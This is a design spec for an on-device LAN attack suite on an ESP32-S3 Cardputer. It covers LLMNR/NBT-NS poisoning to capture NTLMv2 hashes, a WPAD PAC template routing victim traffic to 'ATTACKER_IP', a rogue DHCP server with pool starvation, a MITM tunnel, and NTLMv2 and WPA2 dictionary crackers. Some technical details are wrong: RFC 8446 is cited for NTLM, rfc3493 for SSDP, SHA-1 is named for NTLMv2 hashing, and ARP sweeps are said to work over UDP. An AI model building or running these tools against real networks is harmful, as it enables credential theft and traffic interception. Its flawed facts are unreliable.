# Network LAN Red-Team Suite + Credential Crackers — Design Spec

**Date:** 2026-07-11  
**Component:** new `applications/main/lan_attack/` + shared `lib/net_hal/` (LAN UDP/TCP primitives for ESP-IDF/lwIP)  
**Target hardware:** M5Stack Cardputer ADV — ESP32-S3, 8 MB flash, **no PSRAM**, native WiFi (STA+AP), SD (FAT32), canvas UI, QWERTY.  
**Framework:** reimplemented Flipper app framework on ESP-IDF v5.4.1 (scenes, view_dispatcher, scene_manager, submenu, variable_item_list, widget, text_input, popup, canvas).  
**Status:** Draft design — for review before implementation plan.

---

## 1. Goal

Ship an authorized, internal-network penetration-testing suite that runs on the native S3 radio, enabling:

1. **Passive/active LAN reconnaissance** — ARP sweep, TCP port scanner, banner grab, SSDP/UPnP/mDNS discovery, printer detection.
2. **Credential capture via poisoning** — LLMNR/NBT-NS/mDNS responder hijacking name-resolution broadcasts to capture NTLMv2 handshakes (hashcat `-m 5500`) and WPAD proxy autoconfiguration.
3. **DHCP attacks** — rogue DHCP server handing out attacker-controlled gateways/DNS; optional starvation to exhaust the legitimate pool.
4. **On-device crackers** — NTLMv2 HMAC-MD5 dictionary attack + WPA/WPA2 PBKDF2-SHA1 handshake cracking, both streaming wordlists from SD (no PSRAM, no in-device rainbow tables).
5. **Lower-priority tools** — Telnet honeypot (credential sniffer) and TCP tunnel/redirect.

The suite is built on a shared **`net_hal`** — a thin wrapper around ESP-IDF lwIP sockets, UDP responder state machines, DHCP packet builders/parsers, and PAC/wpad templating — that decouples network I/O logic from the app UI and enables host-testable pure cores (frame builders, hashers, wordlist streamers).

---

## 2. Context — existing network primitives

### 2.1 WiFi app evil-portal template (reuse as-is)

`applications/main/wlan_app/wlan_evil_portal.c` already demonstrates:

- **SoftAP spawn** via `wlan_hal_evil_portal_start()` (SSID/channel/password).
- **DNS catch-all task** (UDP, port 53) hijacking every query to the AP's IP — no parsing required, just return the AP IP for *all* queries.
- **`esp_http_server` captive portal** accepting POST credentials, appending to SD.
- **NAPT bridge** to forward traffic upstream (`wlan_hal_evil_portal_set_dns_upstream`).
- **Memory discipline for no-PSRAM:** DNS cache is 8 entries × 344 B (~2.7 KB), HTML is streamed from SD into the httpd response (never fully resident).

This is the exact **network-service template** to copy: background task + socket + state machine + SD stream.

### 2.2 lwIP availability on ESP-IDF v5.4.1

The port runs `lwip/` inside the FreeRTOS kernel on the ESP32-S3:

- **Raw UDP sockets:** `socket(AF_INET, SOCK_DGRAM)` + `sendto`/`recvfrom` (used already in DNS evil-portal).
- **Raw TCP sockets:** `socket(AF_INET, SOCK_STREAM)` + `bind`/`listen`/`accept` + `send`/`recv` (standard POSIX style).
- **ARP** — not directly exposed; ARP is implicit in IP neighbor discovery. Ping/ICMP and broadcast ARP requests are the typical scan methods.
- **Low-level IP:** `esp_netif`, `eth_input`, and raw sockets over it.

No kernel raw-packet socket or BPF; **UDP/TCP only** (sufficient for the scope).

### 2.3 No-PSRAM constraints (already documented in wlan_app)

- Internal RAM (SRAM) for the board is ~320 KB shared with BLE/WiFi/FreeRTOS.
- Largest contiguous free block on idle: ~150–200 KB (before any app). Promiscuous RX ring uses 4.3 KB; SoftAP+DNS+httpd takes ~30–40 KB.
- **Evil-portal DNS cache:** 8 entries, 344 B each, not 32 large. **Spill large captures to SD**, never buffer.

---

## 3. Design — attacks (mechanism, architecture, UI flow, SD artifacts)

Shared SD root: **`/ext/lan_attack/`**. Layout:

```
/ext/lan_attack/
  captures/        nmap_<ts>.csv, ssdp_<ts>.txt, probes_<ts>.csv, credentials_<ts>.csv
  wordlists/       passwords.txt, common_ssids.txt (for WPA reuse if present)
  results/         ntlmv2_cracked_<ts>.csv, wpa_cracked_<ts>.csv, hashes_<ts>.txt
  AUTHORIZED       (optional token, section 10)
```

### 3.1 Passive LAN Recon (lower-priority, no authorization gate)

**Mechanism:** STA mode, WLAN connected. From that network interface:

- **ARP sweep:** craft ARP request frames (broadcast `ff:ff:ff:ff:ff:ff` on the local subnet) asking "who has X.X.X.y?" for each host in the CIDR range. Parse ARP replies to list active IPs + MAC vendors.
- **TCP port scanner:** for each alive IP, attempt SYN to port list (22, 80, 443, 445, 3389, 3306, 5432, 8080, ...). Record port/service.
- **Banner grab:** on open port, send a small probe (SSH sends "\r\n", HTTP sends "GET / HTTP/1.0\r\n\r\n") and capture the first N bytes of the response.
- **SSDP/UPnP discovery:** multicast to `239.255.255.250:1900`, send `M-SEARCH *` (rfc3493); parse `LOCATION` URLs in responses to find IoT devices, printers, AV systems.
- **mDNS probe:** multicast to `224.0.0.251:5353` with mDNS query (QClass=IN, RRTYPE=PTR) for `_services._dns-sd._udp.local`; collects running services.
- **Printer detection:** combine SSDP + mDNS to identify printers; write to results.

**UI flow:** 
1. Main menu → Recon
2. Connect to a target WLAN (or use current STA if already joined)
3. Pick scan mode (ARP only / TCP ports / banner / SSDP / mDNS / all)
4. Live scan view (progress, hosts found, ports/services enumerated)
5. Scrollable results + export to CSV

**SD artifacts:**
- `nmap_<ts>.csv`: IP,MAC,Vendor,Hostname(reverse-DNS if available)
- `ssdp_<ts>.txt`: device type, location, friendly name (parsed from UPNP XML)
- Per-IP `ports_<IP>_<ts>.csv`: port,service,banner-snippet

**Gate:** none (reconnaissance is low-risk; users can audit their own network).

### 3.2 LLMNR/NBT-NS/mDNS Poisoner → NTLMv2 Capture (requires auth unlock)

**Mechanism:**

- **Passive sniffer task** in STA mode listens on UDP 5355 (LLMNR), 137 (NetBIOS NS), 5353 (mDNS) for name-resolution broadcast queries.
- **Responder task** (when poisoning is armed) crafts replies:
  - LLMNR query `host.local?` → reply claiming to be that host (spoofed unicast back to querier).
  - NBT-NS query `HOST` → reply claiming to be the NetBIOS name (similar).
  - mDNS query for `_printer._tcp.local` → reply as a printer service.
- **Minimal auth-soliciting listener:** spin up an SMB listener (port 445, minimal) or HTTP listener that triggers NTLM auth (a 401 Unauthorized with `WWW-Authenticate: NTLM`). When a client connects (redirected by the poisoned DNS), the listener captures the NTLM handshake (challenge/response).
- **NTLMv2 extraction:** parse the NTLM Type-3 response message to extract the client username, domain, NTLMv2 response (the `HMAC_MD5(pwd, challenge + context)` blob), and write it in hashcat `-m 5500` format: `username::domain:challenge:response` (hex).

**State machine:**
```
IDLE → (start poisoning) → LISTENING
  LISTENING:
    - poll UDP 5355/137/5353 (or use socket select)
    - on query, reply immediately (unicast to querier, spoofed IP)
    - forward query to "auth listener" task
  AUTH_LISTENER (separate task):
    - accept TCP 445/HTTP on 0.0.0.0 (SoftAP or DHCP-assigned GW IP)
    - on connect, send NTLM negotiate frame
    - on client response, capture Type-3 message
    - write hash to SD
    - close connection
  (stop poisoning) → IDLE
```

**UI flow:**
1. Main menu → Credentials → LLMNR/NBT-NS/mDNS Poison
2. Pick target hostname (text input) or auto-respond to *all* queries
3. Optional: pick which services (LLMNR / NBT / mDNS) to poison
4. Run view: query count, captured hashes count, live hash hex display
5. Stop → view captured hashes + option to export
6. Export: `/ext/lan_attack/credentials/ntlmv2_<ts>.csv` in hashcat format

**SD artifacts:**
- `/ext/lan_attack/credentials/ntlmv2_<ts>.csv`: one line per capture: `username::domain:challenge_hex:response_hex`

**Feasibility note:** UDP broadcast reply + minimal SMB auth is low-latency; the challenge is parsing NTLM frames (Type-1 negotiate, Type-3 response). Pure C parsers (section 4) are host-testable.

**Gate:** requires authorization unlock (section 10) — active network interference.

### 3.3 WPAD/PAC Proxy Autoconfiguration (pairs with evil portal SoftAP)

**Mechanism:**

- When the evil-portal SoftAP is running, a second service answers HTTP requests to `http://wpad.local/wpad.dat` (or just `GET /wpad.dat`) with a PAC (Proxy Auto-Config) file.
- The PAC tells the victim's OS: "connect to HTTP proxy at the attacker's IP for all traffic."
- Victim's browser/system connects to the attacker's HTTP listener, leaking credentials and enabling MITM of proxy traffic.

**Template-based generation:**
- Hardcoded minimal PAC: `function FindProxyForURL(url, host) { return "PROXY ATTACKER_IP:8080"; }`
- Substitution: `%ATTACKER_IP%` → the SoftAP's gateway IP (e.g., 192.168.1.1).
- Store template in `/ext/lan_attack/wordlists/wpad.pac` if user wants custom.

**UI flow:**
1. Main menu → Credentials → Evil Portal / WPAD
2. Set SSID, enable WPAD checkbox
3. (optional) pick PAC template file
4. Run view (same as evil-portal, but also logs WPAD.dat requests)
5. Captured proxy traffic → optional tunnel to upstream HTTP listener (lower-priority; note as TODO).

**SD artifacts:**
- WPAD template read from `/ext/lan_attack/wordlists/wpad.pac` (or use hardcoded if not present).
- Log file: `/ext/lan_attack/captures/wpad_requests_<ts>.txt` (client IP, User-Agent, Host header).

**Gate:** same as evil portal — requires unlock when SoftAP is active (section 10).

### 3.4 Rogue DHCP Server + Starvation (requires auth unlock)

**Mechanism:**

- **Listen on UDP 67 (DHCP server port)** for DHCP Discover / Request frames.
- **Respond with Offer/Ack** assigning an IP from a pool (e.g., 192.168.100.X), setting:
  - Gateway (router option 3) → attacker IP or upstream router IP
  - DNS (option 6) → attacker IP (to poison DNS)
  - Lease time (option 51) → very short (60 s) to force frequent renewal
- **Starvation mode (optional):** hand out so many IPs that the real DHCP pool is exhausted, forcing clients to use the rogue server only.

**State machine:**
```
IDLE → (start DHCP) → RUNNING
  RUNNING:
    - listen UDP 67
    - on Discover, select IP from pool, send Offer
    - on Request, if IP in pool, send Ack; else send Nak
    - track leased IPs (for starvation: exhaust pool fast)
  (stop DHCP) → IDLE (release leased IPs, optionally send Nak to active clients)
```

**DHCP packet building:** pure C functions `dhcp_build_offer()`, `dhcp_build_ack()`, etc., no esp/furi deps — host-testable.

**UI flow:**
1. Main menu → Network Attacks → Rogue DHCP
2. Set server IP (e.g., 192.168.100.1), pool start/end
3. Optional: set gateway + DNS override
4. Optional: enable Starvation (exhaust pool)
5. Run view: requests received, IPs issued, active leases count
6. Leases → scrollable list (IP, MAC, hostname, assigned time)
7. Stop → confirm release

**SD artifacts:**
- `/ext/lan_attack/captures/dhcp_leases_<ts>.csv`: issued_time,client_mac,hostname,assigned_ip,gateway,dns

**Gate:** requires authorization unlock — disruptive to network; may violate terms.

### 3.5 On-Device NTLMv2 Cracker (HMAC-MD5 dictionary, pure C core)

**Mechanism:**

- **Pure core:** `ntlmv2_crack.{c,h}` — given:
  - NTLMv2 hash (username, domain, challenge, response)
  - A candidate password string
  - Compute: `HMAC_MD5(password, challenge || context)` and compare to the captured response.
- **Wordlist streaming:** open `/ext/lan_attack/wordlists/passwords.txt`, read one line per iteration, hash it, test.
- **Threading:** dual-core (Core 0 + Core 1 via FreeRTOS task). Main task queues passwords; two worker tasks consume and hash in parallel.
- **No large buffers:** keep one hash state + one candidate in flight per core.

**Performance note:** On ESP32-S3 @ 240 MHz, rough estimate is 500–1000 passwords/second (depends on SHA-1 + HMAC overhead). For a 1M-line wordlist, expect 15–30 minutes. Honest about this in the UI.

**UI flow:**
1. Main menu → Crackers → NTLMv2
2. (optionally load from captured credentials CSV, or paste hash)
3. Pick wordlist file (default `/ext/lan_attack/wordlists/passwords.txt`)
4. Run view: passwords tested/sec, elapsed time, cracked? (display cracked password if found)
5. Result → save to `/ext/lan_attack/results/ntlmv2_cracked_<ts>.csv`

**SD artifacts:**
- Input: `/ext/lan_attack/captures/ntlmv2_<ts>.csv` (hashes to crack)
- Wordlist: `/ext/lan_attack/wordlists/passwords.txt`
- Output: `/ext/lan_attack/results/ntlmv2_cracked_<ts>.csv` — one line: `username::domain:password_found` (or "NOT_FOUND")

**Pure core host-test:** feed canned NTLMv2 hash + known password, verify HMAC-MD5 output matches.

**Gate:** none (cracking is post-capture, offline-safe).

### 3.6 On-Device WPA/WPA2 Cracker (PBKDF2-SHA1 dictionary, dual-core)

**Mechanism:**

- **Pure core:** `wpa_crack.{c,h}` — given:
  - Captured WPA/WPA2 handshake (SSID, BSSID, anonce, snonce, mic)
  - A candidate password
  - Compute: `PMK = PBKDF2_HMAC_SHA1(password, SSID, 4096)`, then `PTK = PRF512(PMK, ...)`, derive MIC key, verify MIC against captured.
- **Handshake format:** load from `.pcap` (reuse `wlan_pcap` reader from wlan_app, or expect a CSV with fields exported by the wifi_attack app).
- **Wordlist streaming:** open `/ext/lan_attack/wordlists/passwords.txt` or `/ext/lan_attack/wordlists/common_ssids.txt`, read one candidate per iteration.
- **Threading:** dual-core (FreeRTOS task on Core 1 if Core 0 is busy elsewhere; serialize to avoid contention). Main task queues candidates; worker tests.

**Performance note:** PBKDF2 @ 4096 iterations is expensive. On ESP32-S3 @ 240 MHz, expect ~5–20 passwords/second per core (SW sha1, no HW accel). For a 100K-line wordlist, expect 1–3 hours single-core, 30–90 min dual-core. Honest about latency; warn the user.

**UI flow:**
1. Main menu → Crackers → WPA/WPA2
2. Load handshake (pick `.pcap` from `/ext/lan_attack/captures/` or CSV)
3. Pick wordlist file
4. Run view: handshakes loaded, candidates tested/sec, elapsed, cracked? (display PSK if found)
5. Result → save to `/ext/lan_attack/results/wpa_cracked_<ts>.csv`

**SD artifacts:**
- Input: `/ext/lan_attack/captures/handshake_<ssid>_<ts>.pcap` (from wifi_attack app) or CSV with (SSID, BSSID, anonce, snonce, mic) hex.
- Wordlist: `/ext/lan_attack/wordlists/passwords.txt` or `/ext/lan_attack/wordlists/common_ssids.txt`
- Output: `/ext/lan_attack/results/wpa_cracked_<ts>.csv` — one line: `SSID,BSSID,password_found` (or "NOT_FOUND")

**Pure core host-test:** feed canned handshake (e.g., from pcap) + known WPA2 password, verify MIC computation matches.

### 3.7 Stretch (lower-priority, flag feasibility)

- **Telnet honeypot** — listen TCP 23, accept connections, capture anything sent (plain-text credentials, probes). Log to SD. Low effort, low risk.
- **TCP tunnel/redirect** — accept connection on one port, forward to another host/port. Enables MITM interception. Needs bi-directional socket relay (medium effort).
- **DNS cache injection** — actively query the network's DHCP-assigned DNS, poison the response to the attacker IP, replay via DNS responses. Less reliable than LLMNR but covers more targets.

---

## 4. Shared `net_hal` — Architecture

**Location:** `lib/net_hal/net_hal.{c,h}`, included as `#include <net_hal/net_hal.h>`.

**Why here:** Matches the established convention (`lib/wifi_raw`, `lib/subghz`, `lib/toolbox`). Apps opt in via `fap_libs=["net_hal"]` in `application.fam`. Enables both the `lan_attack` app and future network-analysis tools (packet sniffer, etc.) to reuse socket primitives without duplication.

**Core responsibilities:**
- lwIP socket lifecycle management (open, bind, listen, accept, send, recv, close).
- State machine helpers for UDP responders (LLMNR, NBT-NS, mDNS, DHCP).
- DHCP packet builders/parsers (pure functions, no socket code).
- Simple TCP tunnel relay (optional stretch).
- ARP/ICMP helpers (ping, ARP request crafting).

### 4.1 Socket lifecycle wrappers

```c
typedef struct {
    int fd;
    uint16_t port;
    // opaque; no socket pointers or fds exposed
} NetHalSocket;

// UDP
NetHalSocket* net_hal_udp_bind(uint16_t port, bool broadcast);
bool net_hal_udp_send(NetHalSocket* sock, const struct sockaddr_in* dest, const uint8_t* data, size_t len);
bool net_hal_udp_recv(NetHalSocket* sock, struct sockaddr_in* src, uint8_t* data, size_t max_len, size_t* out_len, uint32_t timeout_ms);
void net_hal_socket_close(NetHalSocket* sock);

// TCP
NetHalSocket* net_hal_tcp_bind(uint16_t port);
NetHalSocket* net_hal_tcp_accept(NetHalSocket* listen_sock, struct sockaddr_in* client_addr, uint32_t timeout_ms);
bool net_hal_tcp_send(NetHalSocket* sock, const uint8_t* data, size_t len);
bool net_hal_tcp_recv(NetHalSocket* sock, uint8_t* data, size_t max_len, size_t* out_len, uint32_t timeout_ms);
// ... close as above
```

### 4.2 Pure frame builders (host-testable, no socket deps)

```c
// DHCP
#define DHCP_BUILD_MAX 548
typedef struct {
    uint8_t buf[DHCP_BUILD_MAX];
    size_t len;
} DhcpFrame;

// Return the size written; 0 on overflow.
size_t dhcp_build_discover(DhcpFrame* out, const uint8_t client_mac[6]);
size_t dhcp_build_offer(DhcpFrame* out, const uint8_t client_mac[6], uint32_t offered_ip, 
                         uint32_t gateway, uint32_t dns, uint16_t lease_time_sec);
size_t dhcp_build_ack(DhcpFrame* out, ...);
size_t dhcp_build_nak(DhcpFrame* out, const uint8_t client_mac[6]);

// Parse
typedef struct {
    uint8_t msg_type;  // Discover, Request, etc.
    uint8_t client_mac[6];
    uint32_t xid;
    // ... other fields as needed
} DhcpParsed;
bool dhcp_parse(const uint8_t* frame, size_t len, DhcpParsed* out);

// LLMNR/mDNS/NBT-NS query parsers (pure)
// ... (deferred; may reuse subset of esp_dns.h or roll minimal parser)

// NTLMv2 response parser
typedef struct {
    char username[256];
    char domain[256];
    uint8_t challenge[8];
    uint8_t response[16];  // the v2 response (actually HMAC-MD5 output)
} NtlmV2Parsed;
bool ntlm_parse_type3(const uint8_t* frame, size_t len, NtlmV2Parsed* out);
```

### 4.3 Hashers and crackers (pure cores)

```c
// NTLMv2: compute the response given password and challenge
void ntlmv2_response_compute(const char* password, const char* username, const char* domain,
                              const uint8_t challenge[8], const uint8_t context[8],
                              uint8_t out_response[16]);  // returns HMAC-MD5 blob

// WPA2: compute MIC given PSK, handshake frames
bool wpa_pmk_compute(const char* password, const char* ssid, uint8_t out_pmk[32]);
bool wpa_ptk_compute(const uint8_t pmk[32], const uint8_t anonce[32], const uint8_t snonce[32],
                      const uint8_t ap_mac[6], const uint8_t sta_mac[6],
                      uint8_t out_ptk[48]);
bool wpa_mic_verify(const uint8_t ptk[48], const uint8_t eapol_frame[/*len*/], size_t eapol_len,
                     const uint8_t captured_mic[16]);
```

### 4.4 CSV and log writers (SD streaming)

```c
// Minimal wrapper: caller opens file, passes the FILE* (via furi_record / storage)
typedef struct { FILE* f; } NetHalCsvLog;

NetHalCsvLog* net_hal_csv_open(const char* path);
void net_hal_csv_write_line(NetHalCsvLog* log, const char* csv_line);  // caller format
void net_hal_csv_close(NetHalCsvLog* log);

// Convenience: hash-writing in standard format
void net_hal_write_ntlmv2_hashcat(NetHalCsvLog* log, const char* username, const char* domain,
                                   const uint8_t challenge[8], const uint8_t response[16]);
void net_hal_write_wpa_hashcat(NetHalCsvLog* log, const char* ssid, const uint8_t bssid[6],
                                const uint8_t anonce[32], const uint8_t snonce[32],
                                const uint8_t mic[16]);
```

---

## 5. Components

### 5.1 New shared module — `lib/net_hal/`

| File | Purpose |
|---|---|
| `net_hal.h` | Public socket/frame-builder interface. |
| `net_hal_socket.c` | UDP/TCP bind, send, recv, close wrappers. |
| `net_hal_dhcp.c` | DHCP packet builders/parsers (pure). |
| `net_hal_ntlm.c` | NTLM-v2 response compute + parser (pure). |
| `net_hal_wpa.c` | WPA/WPA2 PMK/PTK/MIC compute + verify (pure, SW sha1/hmac). |
| `net_hal_scan.c` | ARP sweep, TCP port scan helpers. |
| `net_hal_csv.c` | CSV + hashcat-format writers. |
| `SConscript`/CMake glue | Register as a `lib` module. |

### 5.2 New app — `applications/main/lan_attack/`

| File | Purpose |
|---|---|
| `application.fam` | `App(appid="lan_attack", name="LAN Attack", apptype=MENUEXTERNAL, entry_point="lan_attack_app", stack_size=8*1024, fap_libs=["assets","net_hal"], order=70)`. |
| `lan_attack_app.{c,h}` | App struct, view_dispatcher/scene_manager setup, SD path helpers, authorization flag. |
| `lan_attack_icons` | Checked-in `.c` byte arrays (no Pillow). |
| `scenes/scene_config.h` | Scene registry. |
| `scenes/scene_main.c` | Root menu: Recon / Credentials / Crackers / (Advanced…) / Authorize. |
| `scenes/scene_authorize.c` | Authorization unlock (section 10). |
| `scenes/scene_recon.c` | Passive LAN recon (ARP sweep, TCP port scan, banner grab, SSDP, mDNS, printer detect). |
| `scenes/scene_llmnr_poison.c` | LLMNR/NBT-NS/mDNS responder + NTLMv2 capture. |
| `scenes/scene_wpad.c` | WPAD/PAC proxy autoconfiguration (pairs with evil portal). |
| `scenes/scene_dhcp.c` | Rogue DHCP server + starvation. |
| `scenes/scene_ntlmv2_crack.c` | Load captured hashes, pick wordlist, run cracker. |
| `scenes/scene_wpa_crack.c` | Load handshake (pcap or CSV), pick wordlist, run cracker. |
| `scenes/scene_telnet_honeypot.c` | (Stretch) Telnet listener + credential log. |
| `views/…` | Status/list canvas views (reuse submenu/widget/variable_item_list/text_input from framework). |
| `lan_attack_recon.{c,h}` | ARP sweep, TCP scan, banner grab (task-driven; calls `net_hal` sockets). |
| `lan_attack_responder.{c,h}` | LLMNR/NBT-NS/mDNS responder state machine (task-driven). |
| `lan_attack_dhcp.{c,h}` | DHCP listener/responder (task-driven). |

**Scene config (initial):** `main, authorize, recon, llmnr_poison, wpad, dhcp, ntlmv2_crack, wpa_crack`.

### 5.3 Integration with existing apps

| File | Change |
|---|---|
| `fam_config.py` | Add `"lan_attack"` to `APPS`; add `"net_hal"` to lib build. |

---

## 6. Security / Authorization Gating

- **Explicit unlock (reuse GPIO `show_advanced` pattern).** App boots with `app->authorized = false`.
- **Passive features available immediately:** LAN recon (scan, discovery, banner grab) is no-risk.
- **Active frame-injecting features hidden** until user visits **Authorize** and confirms a two-step acknowledgement:
  - Step 1: warning pop-up ("LLMNR poisoning will interfere with name resolution on this network").
  - Step 2: explicit OK on a widget (mirrors `GpioManualEventToggleAdvanced`).
- **Optional token file:** `/ext/lan_attack/AUTHORIZED` (absence requires longer confirm; presence is faster).
- **Session-scoped:** authorization resets to `false` on app exit.
- **On-air identity:** all poisoned responses use spoofed MAC (if crafted manually); DHCP offers use the attacker's IP, never the device's factory MAC.
- **Clear labeling:** menu footer "Authorized testing only"; run views display "Active attack in progress".

---

## 7. No-PSRAM discipline (explicit)

- **DNS cache:** 8 entries (~2.7 KB, matching evil-portal pattern), not 32.
- **Recon results:** bounded in-RAM table (~10 KB for hosts, ~5 KB for ports) with spill-to-SD when full.
- **DHCP lease pool:** tracked in a single fixed array (max 50 leases, ~2 KB).
- **Capture buffers:** never buffer full frames. Write NTLMv2 hashes line-by-line to SD as captured.
- **Wordlist streaming:** open file, read one line per iteration (password), discard after use.
- **Handshake parsing:** load once from pcap/CSV into a bounded struct (nonces, MIC, etc., ~100 bytes); stream wordlist candidates through.

---

## 8. Constraints to state explicitly

1. **No companion radio / wired NIC.** Pure S3 native WiFi (STA + optional SoftAP). No W5500 Ethernet.
2. **UDP/TCP only.** lwIP sockets are the I/O layer. No kernel raw-packet socket or BPF (no injection-level frame crafting, only UDP/TCP).
3. **No concurrent BT + WiFi.** Radios mutually exclusive; BT is released on entry, needs reboot to return (documented in wlan_app).
4. **Single app or scenes in existing apps?** Recommend **new `lan_attack` app** — consolidates network attack UI, reuses `net_hal`, coexists with `wlan_app` and `wifi_attack` (if future). Justification: LAN attacks are orthogonal to WiFi attacks; network I/O (sockets, responders) is separate from radio (802.11 TX/RX); cleaner if not merged into wlan_app (which is already large).
5. **Honest about cracker throughput:** NTLMv2 ~500–1000 pwd/sec, WPA ~5–20 pwd/sec (dual-core SW sha1/pbkdf2). Display estimated time.

---

## 9. Testing

### 9.1 Compile gate (host + build)

- **Host unit tests (pure logic):**
  - `net_hal_dhcp`: build Discover/Offer/Ack frames → byte-exact output; parse captured frames.
  - `net_hal_ntlm`: compute NTLM-v2 response (password + challenge) → verify matches known output.
  - `net_hal_wpa`: compute PMK/PTK from PSK/SSID; verify MIC from captured M4.
  - Frame parsers fed canned data → correct field extraction.
  - CSV writers → proper format (hashcat `-m 5500` for NTLMv2, `-m 22000` for WPA2 handshake).
- **Build:** `MSYS_NO_PATHCONV=1 cmd.exe /c "…\build_ci.bat"` with `IDF_TOOLS_PATH=~/.espressif`. Green build of both `lan_attack` and `net_hal`.

### 9.2 On-hardware checklist (Cardputer ADV in lab network)

1. **LAN Recon:**
   - ARP sweep finds all connected devices on the subnet.
   - TCP port scanner connects to each and captures open ports.
   - Banner grab retrieves SSH/HTTP headers correctly.
   - SSDP/mDNS discovery finds IoT/printer devices.
   - CSV exports to `/ext/lan_attack/captures/nmap_<ts>.csv` and is valid.

2. **LLMNR/NBT-NS Poison:**
   - Responder task enabled; name queries on the network are answered by the device (verify with nslookup or `nbtstat -A <victim>`).
   - Victim connects to attacker's IP; SMB/HTTP auth listener captures NTLM Type-3.
   - Hash written to CSV in hashcat `-m 5500` format.
   - Cracker loads the hash and test-cracks with a known password (offline validation).

3. **WPAD:**
   - SoftAP running; client joins.
   - Client requests `http://wpad.local/wpad.dat`; attacker serves PAC.
   - Client proxies subsequent traffic through attacker's HTTP listener.
   - Log file `/ext/lan_attack/captures/wpad_requests_<ts>.txt` contains client requests.

4. **Rogue DHCP:**
   - Disable real DHCP server (or run on isolated subnet).
   - New DHCP client requests address; rogue server hands out IP from pool.
   - Client gets attacker-controlled gateway/DNS.
   - Leases logged to `/ext/lan_attack/captures/dhcp_leases_<ts>.csv`.

5. **NTLMv2 Cracker:**
   - Load captured hash.
   - Run cracker with wordlist containing the correct password.
   - Cracker finds password; output written to `/ext/lan_attack/results/ntlmv2_cracked_<ts>.csv`.
   - Performance: ~500–1000 pwd/sec displayed in run view.

6. **WPA Cracker:**
   - Capture a real 4-way handshake (reuse wifi_attack app if available).
   - Load `.pcap` into cracker.
   - Run with wordlist containing the WPA2 PSK.
   - Cracker finds password; output written to `/ext/lan_attack/results/wpa_cracked_<ts>.csv`.
   - Performance: ~5–20 pwd/sec displayed; warn about latency.

7. **Authorization gate:**
   - LLMNR poison / DHCP / WPAD scenes hidden until Authorize.
   - Authorize requires two-step confirm.
   - After app exit, re-entry re-prompts.

8. **Lifecycle stress:**
   - Enter/exit every scene 10× rapidly; no crash, no hung responder task.
   - Heap returns to baseline; no leaked sockets or tasks.

---

## 10. Feasibility risks + mitigation

1. **lwIP raw socket limitations (highest).** lwIP sockets are POSIX-like (UDP/TCP) but lack some features:
   - No raw ICMP (can't craft custom ping frames; must use `esp_ping`).
   - No ARP API (must use broadcast ARP requests via UDP or ICMP multicast).
   - **Mitigation:** ARP sweep is feasible via broadcast ARP request; TCP port scan via connect attempts (SYN implicit). ICMP for ping reachability check via `esp_ping_*` if available.

2. **DHCP statefulness (medium).** Rogue DHCP must track issued leases, reject Request for unknown IPs (RFC 2131). **Mitigation:** bounded lease table (max 50 simultaneous), FIFO overflow.

3. **NTLM parser complexity (medium).** Parsing NTLM Type-3 response requires understanding the binary frame format (offsets, lengths, buffer pointers). **Mitigation:** pure C parser, host-testable; reference RFC 8446 + Wireshark dissector. Frame size is well-defined (Type-3 = negotiate + challenge + response, ~80–400 bytes).

4. **WPA cracker throughput (medium — honest limitation).** SW PBKDF2-SHA1 @ 4096 iterations is slow on a 240 MHz CPU. **Mitigation:** use a reference implementation (optimized SW sha1 from mbedTLS if available, or roll tight ASM). Document the latency; target 5–20 pwd/sec as "good for a dict of 10K–100K common passwords."

5. **Concurrent socket management (medium).** Multiple scenes (recon, responder, cracker) may run overlapping. **Mitigation:** each scene owns its sockets via a task (Furi thread or FreeRTOS). Scene cleanup on exit must join the task and close sockets before freeing the scene struct.

6. **No-PSRAM heap fragmentation (medium).** Running SoftAP (from evil-portal / wpad scenes) + recon + cracker consumes ~60–80 KB. **Mitigation:** keep recon results bounded; spill to SD; don't run all simultaneously (mutually-exclusive scenes).

7. **Responder jitter (low).** UDP response latency under load may exceed the query timeout. **Mitigation:** socket with immediate send; no blocking I/O in responder hot path.

---

## 11. Non-Goals

- **Not** packet-level frame crafting (ARP, IP, ICMP, etc.) — pure UDP/TCP sockets.
- **Not** a standalone protocol parser library — inline, minimal parsers per protocol (DHCP, NTLM, WPA).
- **Not** full Kerberos support (NTLMv2 only; Kerberos is out-of-scope).
- **Not** WPA3 SAE cracking (needs elliptic-curve math; too slow on CPU).
- **Not** reverse engineering (cracks public hashes only).
- **No** simultaneous multi-network attacks (one LAN at a time).
- **No** IPv6.
- **No** TLS interception (beyond capturing NTLMv2 handshakes over HTTP).

---

## 12. Open items to confirm during implementation

1. **lwIP ICMP ping availability:** confirm `esp_ping_*` is available; if not, emulate with ARP broadcast.
2. **Wordlist sources:** pre-populate `/ext/lan_attack/wordlists/` with a small demo list (e.g., rockyou-top-1k.txt).
3. **DHCP RFC compliance:** confirm the builder/parser handles all required options (subnet mask, lease time, renewal, rebind).
4. **NTLM frame format:** validate Type-3 response parsing against real captures from a Windows client (Wireshark pcap).
5. **WPA handshake format:** confirm the pcap reader (reuse or adapt from wifi_attack) can extract M1/M2/M3/M4 + beacon SSID.
6. **Icon authoring:** draw `lan_attack` menu icons as checked-in `.c` byte arrays.
7. **Scene menu order:** confirm no collisions with existing appid/order values in `fam_config.py`.
8. **Split cracker across dual-core:** decide whether to use one FreeRTOS task (Core 0 pinned, or unpinned) or spawn a second task for Core 1. Default: **one task, unpinned** (scheduler assigns as needed); if contention observed, pin to Core 1 and keep main on Core 0.

---

## 13. Architecture Summary

- **`net_hal`** — shared library (sockets, DHCP/NTLM/WPA parsers/builders, crackers, CSV writers). Pure cores are host-testable; socket wrappers encapsulate lwIP. ~2000 lines.
- **`lan_attack` app** — UI orchestration (scenes, views, scene manager). Spawns FreeRTOS tasks for responders/crackers; tasks consume `net_hal` primitives and write to SD. Each task (recon, LLMNR responder, DHCP listener, cracker worker) is independent and joins on scene exit. ~1500 lines scenes + 1000 lines task logic.
- **Integration:** both modules register in `fam_config.py`; `lan_attack` declares `fap_libs=["net_hal"]` in `application.fam`.
- **Memory footprint:** ~80 KB on-device at peak (SoftAP + responder + small recon table + one cracker thread).
- **SD artifacts:** all captures, wordlists, and results under `/ext/lan_attack/`, never buffered in RAM.

---

## 14. Version control note

This project is **not** a git repository (release download), so the spec lives at:  
`docs/superpowers/specs/2026-07-11-network-lan-suite-design.md`

